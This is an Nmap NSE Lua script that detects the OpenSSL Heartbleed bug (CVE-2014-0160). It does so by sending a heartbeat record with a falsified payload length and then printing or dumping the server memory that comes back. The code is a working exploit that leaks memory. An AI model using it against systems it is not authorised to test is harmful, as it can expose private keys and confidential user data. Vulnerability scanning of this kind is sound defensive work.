description = [[
Detects whether a server is vulnerable to the OpenSSL Heartbleed bug (CVE-2014-0160).
The code is based on the Python script ssltest.py authored by Jared Stafford (jspenguin@jspenguin.org).

Provide -d flag for a dump of leaked memory.
]]

---
-- @usage
-- nmap -p 443 --script ssl-heartbleed <target>
--
-- @output
-- PORT    STATE SERVICE
-- 443/tcp open  https
-- | ssl-heartbleed:
-- |   VULNERABLE:
-- |   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
-- |     State: VULNERABLE
-- |     Risk factor: High
-- |     Description:
-- |       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
-- |
-- |     References:
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
-- |       http://www.openssl.org/news/secadv_20140407.txt
-- |_      http://cvedetails.com/cve/2014-0160/
--
--
-- @args ssl-heartbleed.protocols (default tries all) TLS 1.0, TLS 1.1, or TLS 1.2
--

local bin = require('bin')
local match = require('match')
local nmap = require('nmap')
local shortport = require('shortport')
local sslcert = require('sslcert')
local stdnse = require('stdnse')
local string = require('string')
local table = require('table')
local vulns = require('vulns')
local have_tls, tls = pcall(require,'tls')
assert(have_tls, "This script requires the tls.lua library from http://nmap.org/nsedoc/lib/tls.html")

author = "Patrik Karlsson <patrik@cqure.net>"
license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
categories = { "vuln", "safe" }

local arg_protocols = stdnse.get_script_args(SCRIPT_NAME .. ".protocols") or {'TLSv1.0', 'TLSv1.1', 'TLSv1.2'}
local dumpfile = stdnse.get_script_args(SCRIPT_NAME .. ".dumpfile") or nil

portrule = function(host, port)
    return shortport.ssl(host, port) or sslcert.isPortSupported(port)
end

-- Thanks to whoever wrote this.
function hexdump(s)
    local manLine="" --human readable format of the current line
    local hexLine="" --hexadecimal representation of the current line
    local address=0     --the address where the current line starts
    local LINE_LENGTH=16 --how many characters per line?
    local ADDRESS_LENGTH=4 --how many characters for the address part?
    local ret=""
    local hex 
    if not hex then
        hex={}
        local digit={[0]="0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F"}
        for i=0,15 do for j=0,15 do hex[i*16+j]=digit[i]..digit[j] end end 
    end 
    for i=1,s:len() do
        local ch=s:sub(i,i)
        if ch:find("%c") then ch="." end--if ch is a control character, assign some default value to it
        manLine=manLine..ch
        hexLine=hexLine..hex[s:byte(i)].." "
        if (i % LINE_LENGTH)==0 or i==s:len() then
            --print(string.format("%04u | %-48s | %s",address,hexLine,manLine))
            ret=ret..string.format("%0"..ADDRESS_LENGTH.."u | %-"..3*LINE_LENGTH.."s| %s\n",address,hexLine,manLine)
            manLine,hexLine="",""
            address=i
        end
    end 
    return ret 
end

local function recvhdr(s)
  local status, hdr = s:receive_buf(match.numbytes(5), true)
  if not status then
    stdnse.print_debug(2, '%s: Unexpected EOF receiving record header - server closed connection',SCRIPT_NAME)
    return
  end
  local pos, typ, ver, ln = bin.unpack('>CSS', hdr)
  return status, typ, ver, ln
end

local function recvmsg(s, len)
  local status, pay = s:receive_buf(match.numbytes(len), true)
  if not status then
    stdnse.print_debug(2, '%s: Unexpected EOF receiving record payload - server closed connection',SCRIPT_NAME)
    return
  end
  return true, pay
end

local function keys(t)
  local ret = {}
  for k, _ in pairs(t) do
    ret[#ret+1] = k
  end
  return ret
end

local function testversion(host, port, version)

  local hello = tls.client_hello({
      ["protocol"] = version,
      ["ciphers"] = {
        "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA",
        "TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA",
        "TLS_SRP_SHA_DSS_WITH_AES_256_CBC_SHA",
        "TLS_SRP_SHA_RSA_WITH_AES_256_CBC_SHA",
        "TLS_DHE_RSA_WITH_AES_256_CBC_SHA",
        "TLS_DHE_DSS_WITH_AES_256_CBC_SHA",
        "TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA",
        "TLS_DHE_DSS_WITH_CAMELLIA_256_CBC_SHA",
        "TLS_ECDH_RSA_WITH_AES_256_CBC_SHA",
        "TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA",
        "TLS_RSA_WITH_AES_256_CBC_SHA",
        "TLS_RSA_WITH_CAMELLIA_256_CBC_SHA",
        "TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA",
        "TLS_ECDHE_ECDSA_WITH_3DES_EDE_CBC_SHA",
        "TLS_SRP_SHA_DSS_WITH_3DES_EDE_CBC_SHA",
        "TLS_SRP_SHA_RSA_WITH_3DES_EDE_CBC_SHA",
        "TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA",
        "TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA",
        "TLS_ECDH_RSA_WITH_3DES_EDE_CBC_SHA",
        "TLS_ECDH_ECDSA_WITH_3DES_EDE_CBC_SHA",
        "TLS_RSA_WITH_3DES_EDE_CBC_SHA",
        "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA",
        "TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA",
        "TLS_SRP_SHA_DSS_WITH_AES_128_CBC_SHA",
        "TLS_SRP_SHA_RSA_WITH_AES_128_CBC_SHA",
        "TLS_DHE_RSA_WITH_AES_128_CBC_SHA",
        "TLS_DHE_DSS_WITH_AES_128_CBC_SHA",
        "TLS_DHE_RSA_WITH_SEED_CBC_SHA",
        "TLS_DHE_DSS_WITH_SEED_CBC_SHA",
        "TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA",
        "TLS_DHE_DSS_WITH_CAMELLIA_128_CBC_SHA",
        "TLS_ECDH_RSA_WITH_AES_128_CBC_SHA",
        "TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA",
        "TLS_RSA_WITH_AES_128_CBC_SHA",
        "TLS_RSA_WITH_SEED_CBC_SHA",
        "TLS_RSA_WITH_CAMELLIA_128_CBC_SHA",
        "TLS_ECDHE_RSA_WITH_RC4_128_SHA",
        "TLS_ECDHE_ECDSA_WITH_RC4_128_SHA",
        "TLS_ECDH_RSA_WITH_RC4_128_SHA",
        "TLS_ECDH_ECDSA_WITH_RC4_128_SHA",
        "TLS_RSA_WITH_RC4_128_SHA",
        "TLS_RSA_WITH_RC4_128_MD5",
        "TLS_DHE_RSA_WITH_DES_CBC_SHA",
        "TLS_DHE_DSS_WITH_DES_CBC_SHA",
        "TLS_RSA_WITH_DES_CBC_SHA",
        "TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA",
        "TLS_DHE_DSS_EXPORT_WITH_DES40_CBC_SHA",
        "TLS_RSA_EXPORT_WITH_DES40_CBC_SHA",
        "TLS_RSA_EXPORT_WITH_RC2_CBC_40_MD5",
        "TLS_RSA_EXPORT_WITH_RC4_40_MD5",
        "TLS_EMPTY_RENEGOTIATION_INFO_SCSV",
      },
      ["compressors"] = {"NULL"},
      ["extensions"] = {
        -- Claim to support every elliptic curve
        ["elliptic_curves"] = tls.EXTENSION_HELPERS["elliptic_curves"](keys(tls.ELLIPTIC_CURVES)),
        -- Claim to support every EC point format
        ["ec_point_formats"] = tls.EXTENSION_HELPERS["ec_point_formats"](keys(tls.EC_POINT_FORMATS)),
        ["heartbeat"] = "\x01", -- peer_not_allowed_to_send
      },
    })

  local payload = "Nmap ssl-heartbleed"
  local hb = tls.record_write("heartbeat", version, bin.pack("C>SA",
      1, -- HeartbeatMessageType heartbeat_request
      0x8030, -- payload length (falsified)
      -- payload length is based on 4096 - 16 bytes padding - 8 bytes packet
      -- header + 1 to overflow
      payload -- less than payload length.
      )
    )

  local s
  local specialized = sslcert.getPrepareTLSWithoutReconnect(port)
  if specialized then
    local status
    status, s = specialized(host, port)
    if not status then
      stdnse.print_debug(2, "%s: Connection to server failed",SCRIPT_NAME)
      return
    end
  else
    s = nmap.new_socket()
    local status = s:connect(host, port)
    if not status then
      stdnse.print_debug(2, "%s: Connection to server failed",SCRIPT_NAME)
      return
    end
  end

  s:set_timeout(5000)

  -- Send Client Hello to the target server
  local status, err = s:send(hello)
  if not status then
    stdnse.print_debug(2,"%s: Couldn't send Client Hello: %s",SCRIPT_NAME,err)
    s:close()
    return nil
  end

  -- Read response
  local done = false
  local supported = false
  local i = 1
  local response
  repeat
    status, response, err = tls.record_buffer(s, response, i)
    if err == "TIMEOUT" then
      -- Timed out while waiting for server_hello_done
      -- Could be client certificate required or other message required
      -- Let's just drop out and try sending the heartbeat anyway.
      done = true
      break
    elseif not status then
      stdnse.print_debug(2,"%s: Couldn't receive: %s",SCRIPT_NAME,err)
      s:close()
      return nil
    end

    local record
    i, record = tls.record_read(response, i)
    if record == nil then
      stdnse.print_debug(2,"%s: Unknown response from server",SCRIPT_NAME)
      s:close()
      return nil
    elseif record.protocol ~= version then
      stdnse.print_debug(2,"%s: Protocol version mismatch",SCRIPT_NAME)
      s:close()
      return nil
    end

    if record.type == "handshake" then
      for _, body in ipairs(record.body) do
        if body.type == "server_hello" then
          if body.extensions and body.extensions["heartbeat"] == "\x01" then
            supported = true
          end
        elseif body.type == "server_hello_done" then
          stdnse.print_debug("we're done!")
          done = true
        end
      end
    end
  until done
  if not supported then
    stdnse.print_debug("%s: Server does not support TLS Heartbeat Requests.",SCRIPT_NAME)
    s:close()
    return nil
  end

  status, err = s:send(hb)
  if not status then
    stdnse.print_debug(2,"%s: Couldn't send heartbeat request: %s",SCRIPT_NAME,err)
    s:close()
    return nil
  end
  while(true) do
    local status, typ, ver, len = recvhdr(s)
    if not status then
      stdnse.print_debug("%s: No heartbeat response received, server likely not vulnerable",SCRIPT_NAME)
      break
    end
    if typ == 24 then
      local pay
      status, pay = recvmsg(s, len)
      s:close()
      if #pay > 3 then
        if dumpfile then
            local file = io.open(dumpfile, "w")
            file:write(pay)
            file:flush()
            file:close()
        else
            stdnse.print_debug("%s: Leaked memory below\n\n%s",SCRIPT_NAME,hexdump(pay))
        end
        return true
      else
        stdnse.print_debug("%s: Server processed malformed heartbeat, but did not return any extra data.",SCRIPT_NAME)
        break
      end
    elseif typ == 21 then
      stdnse.print_debug("%s: Server returned error, likely not vulnerable",SCRIPT_NAME)
      break
    end
  end

end

action = function(host, port)
  local vuln_table = {
    title = "The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.",
    state = vulns.STATE.NOT_VULN,
    risk_factor = "High",
    description = [[
OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
    ]],

    references = {
      'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160',
      'http://www.openssl.org/news/secadv_20140407.txt ',
      'http://cvedetails.com/cve/2014-0160/'
    }
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)
  local test_vers = arg_protocols

  if type(test_vers) == 'string' then
    test_vers = { test_vers }
  end

  for _, ver in ipairs(test_vers) do
    if nil == tls.PROTOCOLS[ver] then
      return "\n  Unsupported protocol version: " .. ver
    end
    local status = testversion(host, port, ver)
    if ( status ) then
      vuln_table.state = vulns.STATE.VULN
      break
    end
  end

  return report:make_output(vuln_table)
end
